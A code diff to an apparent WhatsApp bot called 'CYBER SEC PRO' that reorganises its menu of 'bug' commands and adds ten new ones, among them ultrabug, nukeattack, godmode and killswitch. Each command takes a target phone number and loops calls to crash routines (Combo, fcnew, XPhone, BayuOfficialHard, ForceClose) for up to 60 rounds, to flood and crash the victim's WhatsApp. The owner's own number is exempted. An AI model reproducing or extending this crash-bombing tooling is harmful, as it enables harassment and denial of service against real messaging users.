@@ -5424,22 +5424,39 @@ case 'CYBERbug': {
 ⚙️ *Powered by CYBER SEC PRO*
 ❖═━═══𖠁𐂃𖠁══━═❖
 
- ┏━━◆ *CYBER - 𝐁𝐔𝐆* ◆━━┓
-│❖ ${prefix}cyberkillgc
-│❖ ${prefix}cyberclose
-│❖ ${prefix}cyber-destroy
-│❖ ${prefix}cyberinvis
-│❖ ${prefix}blank
-│❖ ${prefix}blankgc
-│❖ ${prefix}bruteclose
-│❖ ${prefix}buggc
-│❖ ${prefix}close-zapp
+ ┏━━◆ *CYBER - 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒* ◆━━┓
+│
+│ ◈ *𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
 │❖ ${prefix}crash
-│❖ ${prefix}crashgc
+│❖ ${prefix}blank
 │❖ ${prefix}delay
 │❖ ${prefix}delayhard
+│❖ ${prefix}cyberinvis
+│❖ ${prefix}cyberclose
+│❖ ${prefix}bruteclose
 │❖ ${prefix}metaclose
+│❖ ${prefix}close-zapp
+│❖ ${prefix}cyber-destroy
+│
+│ ◈ *𝗡𝗘𝗪 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
+│❖ ${prefix}ultrabug
+│❖ ${prefix}megabug
+│❖ ${prefix}ghostcrash
+│❖ ${prefix}superlag
+│❖ ${prefix}terminator
+│❖ ${prefix}shadowbug
+│❖ ${prefix}nukeattack
+│❖ ${prefix}godmode
+│❖ ${prefix}killswitch
+│❖ ${prefix}quantumbug
+│
+│ ◈ *𝗚𝗥𝗢𝗨𝗣 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
+│❖ ${prefix}buggc
 │❖ ${prefix}xgroup
+│❖ ${prefix}crashgc
+│❖ ${prefix}blankgc
+│❖ ${prefix}cyberkillgc
+│
 ┗━━━━━━━━━━━━━━━━━━━━┛
 
 ⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
@@ -14205,6 +14222,349 @@ case 'blankgc': {
 }
 break;
 
+//====================[ NEW POWERFUL BUG COMMANDS 2026 ]===========================//
+
+case 'ultrabug': {
+    if (!isCreator) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}ultrabug 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`☢️ *ULTRABUG — MAXIMUM DESTRUCTION*\n🎯 *Target:* ${pepec}\n💀 *20 Round Mega Barrage Starting...*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });
+
+    try {
+        await CYBEReress();
+        await sleep(20);
+        for (let round = 0; round < 20; round++) {
+            await Promise.all([
+                Combo(target),
+                fcnew(target),
+                XPhone(target)
+            ]);
+            await sleep(15);
+            await BayuOfficialHard(target);
+            await sleep(10);
+            for (let i = 0; i < 50; i++) {
+                await ForceClose(target);
+                await sleep(10);
+            }
+            await sleep(15);
+        }
+        reply(`✅ *ULTRABUG complete — 20 rounds on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
+}
+break;
+
+case 'megabug': {
+    if (!isCreator) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}megabug 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`🌀 *MEGABUG — SPIRAL ATTACK*\n🎯 *Target:* ${pepec}\n🔥 *Initiating 15-round spiral barrage...*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
+
+    try {
+        for (let round = 0; round < 15; round++) {
+            await fcnew(target); await sleep(10);
+            await fcnew(target); await sleep(10);
+            await Combo(target); await sleep(10);
+            await Combo(target); await sleep(10);
+            await XPhone(target); await sleep(10);
+            await XPhone(target); await sleep(10);
+            await BayuOfficialHard(target); await sleep(10);
+            for (let i = 0; i < 40; i++) {
+                await ForceClose(target); await sleep(8);
+            }
+            await sleep(10);
+        }
+        reply(`✅ *MEGABUG complete on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '💥', key: m.key } });
+}
+break;
+
+case 'ghostcrash': {
+    if (!isCreator) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}ghostcrash 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`👻 *GHOSTCRASH — INVISIBLE STRIKE*\n🎯 *Target:* ${pepec}\n🔥 *Ghost mode activated...*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '👻', key: m.key } });
+
+    try {
+        await CYBEReress(); await sleep(20);
+        for (let round = 0; round < 12; round++) {
+            await XPhone(target); await sleep(12);
+            await BayuOfficialHard(target); await sleep(12);
+            await Combo(target); await sleep(12);
+            await fcnew(target); await sleep(12);
+            for (let i = 0; i < 60; i++) {
+                await ForceClose(target); await sleep(7);
+            }
+            await sleep(12);
+        }
+        reply(`✅ *GHOSTCRASH complete on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '🥶', key: m.key } });
+}
+break;
+
+case 'superlag': {
+    if (!isCreator) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}superlag 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`⚡ *SUPERLAG — EXTREME LAG INJECTION*\n🎯 *Target:* ${pepec}\n🔥 *25 rounds of lag attack...*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
+
+    try {
+        for (let round = 0; round < 25; round++) {
+            await fcnew(target); await sleep(8);
+            await Combo(target); await sleep(8);
+            await XPhone(target); await sleep(8);
+            for (let i = 0; i < 30; i++) {
+                await ForceClose(target); await sleep(6);
+            }
+            await sleep(8);
+        }
+        reply(`✅ *SUPERLAG complete on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '😈', key: m.key } });
+}
+break;
+
+case 'terminator': {
+    if (!isCreator) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}terminator 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`🤖 *TERMINATOR — FULL SYSTEM WIPE*\n🎯 *Target:* ${pepec}\n🔥 *Termination sequence: 30 rounds*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '🤖', key: m.key } });
+
+    try {
+        await CYBEReress(); await sleep(15);
+        for (let round = 0; round < 30; round++) {
+            await Combo(target); await sleep(8);
+            await fcnew(target); await sleep(8);
+            await XPhone(target); await sleep(8);
+            await BayuOfficialHard(target); await sleep(8);
+            for (let i = 0; i < 20; i++) {
+                await ForceClose(target); await sleep(6);
+            }
+            await sleep(8);
+        }
+        reply(`✅ *TERMINATOR — Target terminated: ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
+}
+break;
+
+case 'shadowbug': {
+    if (!isCreator) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}shadowbug 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`🌑 *SHADOWBUG — DARK FORCE ATTACK*\n🎯 *Target:* ${pepec}\n🔥 *Shadow mode: 18 rounds...*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '🌑', key: m.key } });
+
+    try {
+        for (let round = 0; round < 18; round++) {
+            await BayuOfficialHard(target); await sleep(10);
+            await BayuOfficialHard(target); await sleep(10);
+            await XPhone(target); await sleep(10);
+            await Combo(target); await sleep(10);
+            for (let i = 0; i < 35; i++) {
+                await ForceClose(target); await sleep(7);
+            }
+            await sleep(10);
+        }
+        reply(`✅ *SHADOWBUG complete on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '🖤', key: m.key } });
+}
+break;
+
+case 'nukeattack': {
+    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}nukeattack 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`☢️ *NUKEATTACK — NUCLEAR OPTION*\n🎯 *Target:* ${pepec}\n🔥 *Nuclear barrage: 50 rounds UNLEASHED*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });
+
+    try {
+        await CYBEReress(); await sleep(10);
+        for (let round = 0; round < 50; round++) {
+            await Promise.all([
+                Combo(target),
+                fcnew(target),
+                XPhone(target),
+                BayuOfficialHard(target)
+            ]);
+            await sleep(8);
+            for (let i = 0; i < 25; i++) {
+                await ForceClose(target); await sleep(5);
+            }
+            await sleep(8);
+        }
+        reply(`✅ *NUKEATTACK — ${pepec} obliterated — 50 rounds done*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
+}
+break;
+
+case 'godmode': {
+    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}godmode 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`⚔️ *GODMODE — DIVINE DESTRUCTION*\n🎯 *Target:* ${pepec}\n🔱 *Unlimited power: no mercy mode*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });
+
+    try {
+        await CYBEReress(); await sleep(10);
+        // Phase 1: Warmup
+        for (let i = 0; i < 5; i++) {
+            await Combo(target); await sleep(10);
+            await fcnew(target); await sleep(10);
+        }
+        // Phase 2: Full Assault
+        for (let round = 0; round < 40; round++) {
+            await Promise.all([Combo(target), fcnew(target), XPhone(target)]);
+            await sleep(6);
+            await BayuOfficialHard(target); await sleep(6);
+            for (let i = 0; i < 30; i++) {
+                await ForceClose(target); await sleep(5);
+            }
+            await sleep(6);
+        }
+        // Phase 3: Kill shot
+        for (let i = 0; i < 20; i++) {
+            await ForceClose(target); await sleep(5);
+        }
+        reply(`✅ *GODMODE complete — divine wrath delivered to ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '🔱', key: m.key } });
+}
+break;
+
+case 'killswitch': {
+    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}killswitch 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`🔴 *KILLSWITCH — INSTANT KILL PROTOCOL*\n🎯 *Target:* ${pepec}\n⚡ *Rapid-fire termination: 60 rounds*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '🔴', key: m.key } });
+
+    try {
+        await CYBEReress(); await sleep(8);
+        for (let round = 0; round < 60; round++) {
+            await Combo(target); await sleep(5);
+            await fcnew(target); await sleep(5);
+            for (let i = 0; i < 15; i++) {
+                await ForceClose(target); await sleep(4);
+            }
+            await sleep(5);
+        }
+        reply(`✅ *KILLSWITCH executed on ${pepec} — 60 rounds*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
+}
+break;
+
+case 'quantumbug': {
+    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!text) return reply(`📌 *Usage:* ${prefix}quantumbug 923xx`);
+
+    let pepec = args[0].replace(/[^0-9]/g, '');
+    let protectedNumbers = ["923417022212"];
+    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
+    let target = pepec + '@s.whatsapp.net';
+
+    reply(`⚛️ *QUANTUMBUG — QUANTUM COLLAPSE*\n🎯 *Target:* ${pepec}\n🔥 *Quantum phase attack: 35 rounds*`);
+    await devtrust.sendMessage(m.chat, { react: { text: '⚛️', key: m.key } });
+
+    try {
+        await CYBEReress(); await sleep(10);
+        for (let round = 0; round < 35; round++) {
+            // Alternating pattern for maximum confusion
+            if (round % 2 === 0) {
+                await Promise.all([XPhone(target), BayuOfficialHard(target)]);
+                await sleep(6);
+                await Promise.all([Combo(target), fcnew(target)]);
+            } else {
+                await Promise.all([Combo(target), fcnew(target)]);
+                await sleep(6);
+                await Promise.all([XPhone(target), BayuOfficialHard(target)]);
+            }
+            await sleep(6);
+            for (let i = 0; i < 20; i++) {
+                await ForceClose(target); await sleep(5);
+            }
+            await sleep(6);
+        }
+        reply(`✅ *QUANTUMBUG complete — quantum collapse on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
+    await devtrust.sendMessage(m.chat, { react: { text: '⚛️', key: m.key } });
+}
+break;
 
 // ✨ TEXT MAKER COMMANDS
 
